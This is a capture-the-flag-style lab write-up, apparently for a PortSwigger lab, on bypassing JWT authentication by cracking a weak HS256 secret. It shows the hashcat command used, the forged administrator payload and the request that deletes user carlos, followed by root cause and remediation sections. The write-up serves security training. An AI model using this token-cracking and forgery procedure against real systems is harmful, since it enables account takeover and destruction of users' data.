# JWT Authentication Bypass via Weak Signing Key

**Category:** Broken Authentication  
**Difficulty:** ⭐⭐ (Practitioner)  
**Severity:** 🔴 Critical  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures

---

## Description

The application uses JWT tokens signed with HS256, but the signing secret is a weak, commonly known word (`secret1`) that appears in standard password wordlists. An attacker can brute-force the secret offline using hashcat, then forge a valid JWT with a modified `sub` claim — for example changing it to `administrator` — re-sign it with the cracked key, and the server will accept it as a legitimate token.

---

## Discovery Process

**Step 1 — Login as regular user**

Logged in using the credentials `wiener:peter` through the standard login form.

> 📸 `01-login-wiener.png`

**Step 2 — Capture the JWT token**

After login, intercepted the session cookie in Burp Suite. The `session` cookie contains a HS256-signed JWT. Copied the raw token for offline cracking.

**Step 3 — Brute-force the signing secret with hashcat**

Ran hashcat against the captured JWT using mode `-m 16500` (JWT/JWS) and the `rockyou.txt` wordlist:

```bash
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt
```

> 📸 `02-hashcat-command.png`

hashcat cracked the secret successfully. The result was displayed in the terminal output alongside the original token hash.

> 📸 `03-hashcat-cracked-secret1.png`

The signing key was confirmed to be: **`secret1`**

---

## Exploitation

**Step 4 — Forge a JWT with `sub: administrator`**

Using Burp's **JWT Editor** extension, opened the captured token and modified the payload — changing `sub` from `"wiener"` to `"administrator"`. Then re-signed the token using the cracked secret `secret1`.

**Modified payload:**

```json
{
  "iss": "portswigger",
  "exp": 1782007634,
  "sub": "administrator"
}
```

**Signing secret used:** `secret1`  
The JWT Editor confirmed the secret as valid and produced a new signed token.

> 📸 `04-jwt-editor-forged-token.png`

**Step 5 — Access `/admin` — success**

Injected the forged token into the `Cookie: session=` header and sent `GET /admin` via Burp Repeater. The server accepted the token and returned the full admin panel, listing users `wiener` and `carlos` with delete options.

> 📸 `05-admin-panel-access.png`

**Step 6 — Delete user `carlos`**

Sent the request:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a07004403548739815a8e440087005e.web-security-academy.net
Cookie: session=<forged-jwt-with-sub:administrator>
```

**Response:**

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The server accepted the request and redirected back to `/admin` — confirming `carlos` was deleted.

> 📸 `06-delete-carlos-302.png`

**Step 7 — Lab solved**

> 📸 `07-lab-solved.png`

---

## Impact

- **Full authentication bypass** — any attacker who cracks the secret can impersonate any account including administrators
- **Privilege escalation** — low-privileged user gains admin access by forging a cryptographically valid token
- **Destructive actions** — admin functions (delete users, access sensitive data) become fully accessible
- **Offline attack** — the brute-force happens entirely offline against the stolen token; no requests to the server are needed during cracking
- **Unsafe HTTP method** — user deletion is triggered via `GET` request, making it vulnerable to accidental execution through browser history, cached links, or CSRF attacks

---

## Root Cause

The application relies on HMAC-SHA256 (HS256) for JWT signing but uses `secret1` — a short, human-readable word present in `rockyou.txt` — as the signing key. Since HS256 is a symmetric algorithm, anyone who knows the secret can produce a valid signature for any payload they choose. The security of the entire authentication scheme depends on the secrecy and entropy of this key; using a guessable value makes offline cracking trivial.

**Vulnerable flow:**

```text
Attacker captures JWT → runs hashcat -m 16500 → cracks "secret1"
→ forges JWT with sub: administrator → re-signs with secret1
→ ❌ Server verifies HMAC → signature matches → accepts forged token
```

**Secure flow:**

```text
Attacker captures JWT → runs hashcat -m 16500
→ ✅ Secret is 256-bit random (e.g. openssl rand -hex 32)
→ Brute-force computationally infeasible → forged token rejected
```

---

## Remediation

- **Use a cryptographically random signing secret** — generate with `openssl rand -hex 32`; never use dictionary words or short strings as HMAC keys
- **Prefer asymmetric algorithms (RS256 / ES256)** — the private key never leaves the server; verification uses only the public key, eliminating brute-force risk entirely
- **Rotate signing keys regularly** — any suspected weak or leaked secret must be rotated immediately, invalidating all existing tokens
- **Enforce minimum key length** — reject startup or configuration with secrets shorter than 256 bits
- **Add integration tests** — send JWTs signed with wrong or weak secrets and assert the server rejects them with `401`

---

## Tools Used

- Burp Suite (Proxy & Repeater)
- Burp JWT Editor Extension
- hashcat v6.2.6 (mode `-m 16500`)
- rockyou.txt wordlist

---

## References

- [PortSwigger – JWT attacks](https://portswigger.net/web-security/jwt)
- [PortSwigger – Brute-forcing secret keys](https://portswigger.net/web-security/jwt#brute-forcing-secret-keys)
- [RFC 7519 – JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [OWASP – Broken Authentication (A07:2021)](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)